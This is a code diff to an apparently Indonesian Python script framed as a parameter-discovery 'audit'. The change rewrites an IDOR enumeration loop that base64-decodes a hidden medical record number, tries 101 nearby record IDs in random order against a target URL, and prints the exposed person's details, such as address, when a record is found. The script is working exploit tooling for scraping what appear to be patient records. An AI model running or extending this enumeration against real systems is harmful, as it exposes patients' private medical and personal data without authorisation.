@@ -187,13 +187,14 @@ def parameter_discovery_audit():
                     # 2. Automated Manipulation Test
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
+                    # Persiapkan rentang 50 sebelum dan 50 sesudah (Total 101 ID)
+                    acuan_rm = int(_decode("MDA1MTA0ODE="))
+                    search_pool = list(range(acuan_rm - 50, acuan_rm + 51))
+                    random.shuffle(search_pool) # Tetap acak urutannya
+                    
                     found_valid = False
-                    attempt = 0
-                    while not found_valid:
-                        attempt += 1
-                        # Mencari secara acak dalam radius 50 (sebelum & sesudah) dari acuan No RM 00510481
-                        acuan_rm = int(_decode("MDA1MTA0ODE="))
-                        test_id = str(acuan_rm + random.randint(-50, 50)).zfill(12)
+                    for attempt, val in enumerate(search_pool, 1):
+                        test_id = str(val).zfill(12)
                         test_url = base_url.replace(original_id, test_id)
                         
                         # Heartbeat pencarian
@@ -228,6 +229,9 @@ def parameter_discovery_audit():
                             print(f" [!] Alamat      : {m_addr}")
                             print(f" [!] Status      : \033[91mIDOR Confirmed\033[0m")
                             break
+                    
+                    if not found_valid:
+                        print(f"\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 50.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
